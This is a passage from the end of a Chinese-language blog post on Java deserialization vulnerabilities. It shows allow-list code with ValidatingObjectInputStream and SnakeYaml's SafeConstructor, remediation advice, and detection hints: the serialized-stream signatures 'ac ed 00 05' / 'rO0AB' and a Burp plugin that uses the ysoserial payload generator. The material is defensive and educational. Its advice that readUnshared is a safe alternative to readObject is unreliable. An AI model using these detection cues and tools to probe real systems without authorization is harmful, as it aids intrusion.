</span></span></span></code></pre></div><p><img src=https://img.l1uyun.one/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_image_3.png></p><h3 id=安全代码>安全代码</h3><h4 id=黑白名单>黑白名单</h4><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span>String<span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>safe</span>(String<span style=color:#6e7681> </span>base64)<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span><span style=color:#ff7b72>try</span><span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span>base64<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span>base64.replace(<span style=color:#a5d6ff>&#34; &#34;</span>,<span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34;+&#34;</span>);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#ff7b72>byte</span><span style=color:#ff7b72;font-weight:700>[]</span><span style=color:#6e7681> </span>bytes<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span>Base64.getDecoder().decode(base64);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span>ByteArrayInputStream<span style=color:#6e7681> </span>stream<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>ByteArrayInputStream(bytes);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span>ValidatingObjectInputStream<span style=color:#6e7681> </span>ois<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>ValidatingObjectInputStream(stream);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#8b949e;font-style:italic>// 只允许反序列化Student class</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span>ois.accept(Student.class);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span>ois.readObject();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#ff7b72>return</span><span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34;ValidatingObjectInputStream&#34;</span>;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>     </span>}<span style=color:#6e7681> </span><span style=color:#ff7b72>catch</span><span style=color:#6e7681> </span>(Exception<span style=color:#6e7681> </span>e)<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#ff7b72>return</span><span style=color:#6e7681> </span>e.toString();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><h4 id=snakeyaml安全构造器>SnakeYaml安全构造器</h4><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// SafeConstructor 是 SnakeYaml 提供的一个安全的构造器。它可以用来构造安全的对象，避免反序列化漏洞的发生。</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>void</span><span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>safe</span>(String<span style=color:#6e7681> </span>content)<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>Yaml<span style=color:#6e7681> </span>y<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>Yaml(<span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>SafeConstructor());<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>y.load(content);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>log.info(<span style=color:#a5d6ff>&#34;[safe] SnakeYaml反序列化: &#34;</span><span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>+</span><span style=color:#6e7681> </span>content);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><h2 id=漏洞修复>漏洞修复</h2><ol><li>更新commons-collections、commons-io等第三方库版本。</li><li>不要使用可以执行任意代码的类型进行反序列化。例如，不要使用 ObjectInputStream.readObject 方法进行反序列化，而应该使用安全的反序列化方法，例如 ObjectInputStream.readUnshared 方法。</li><li>对于来源不可信的序列化数据，不要直接进行反序列化，而应该先进行校验，确保它不存在恶意代码。例如，可以对序列化数据的长度、格式进行校验，避免反序列化漏洞的发生。</li></ol><h2 id=漏洞发现>漏洞发现</h2><p>黑盒发现（流量捕获）
白盒发现（特征类接口函数）</p><h3 id=白盒>白盒</h3><p>看是否用到了这些库,以及上面那些函数吧
<img src=https://img.l1uyun.one/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_image_4.png></p><h3 id=黑盒>黑盒</h3><p>黑盒的话看流量,看特征码
java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，</p><p>burp插件
<img alt=|600 src=https://img.l1uyun.one/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_image_5.png></p><p>需要配置一下ysoserial(一款java反序列化漏洞payload生成器)的路径</p><h1 id=一句话总结>一句话总结</h1><p>反序列化时会调用被反序列化对象的readObject方法,当这个方法被重写后,就会导致漏洞产生</p><h1 id=参考>参考</h1><p><a href=https://www.freebuf.com/articles/web/333697.html>Java反序列化基础篇-01-反序列化概念与利用 - FreeBuf网络安全行业门户</a>
<a href=https://www.cnblogs.com/piaomiaohongchen/p/16447244.html>java反序列化漏洞专项 - 飘渺红尘✨ - 博客园</a>
<a href="https://xz.aliyun.com/t/13060?time__1311=GqmhBK4GxRhx%2FWNiQo40IFqWuxiw5pD">JAVA安全-序列化与反序列化基础详解</a></p></div></article><hr><div class=pagination><div class=pagination__buttons><span class="button next"><a href=https://l1uyun.one/posts/2024/07/javasec-xxe/><span class=button__text>javasec-xxe</span>
<span class=button__icon>→</span></a></span></div></div><script src=https://utteranc.es/client.js repo=L1uYun/l1uyun_blog label="blog comment" issue-term=title theme=github-light crossorigin=anonymous async></script></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2024</span>
<span><a href=https://l1uyun.one/></a></span><span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
<span><a href=https://l1uyun.one/posts/index.xml target=_blank title=rss><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span><span>Made with &#10084; by <a href=https://github.com/rhazdon>Djordje Atlialp</a></span></div></div></footer></div><script type=text/javascript src=https://l1uyun.one/bundle.min.243fec32d3a4ae91a0f3d22849096c696784566f8bf3d340ce4ebfd711d99f3cac4489fe226e2645c6c5c284d863f37ddc0d610af7b3fa108a2d4387981d3db7.js integrity="sha512-JD/sMtOkrpGg89IoSQlsaWeEVm+L89NAzk6/1xHZnzysRIn+Im4mRcbFwoTYY/N93A1hCvez+hCKLUOHmB09tw=="></script><script src=https://l1uyun.one/js/view-image.min.js></script><script>window.ViewImage&&ViewImage.init(".content img")</script></body></html>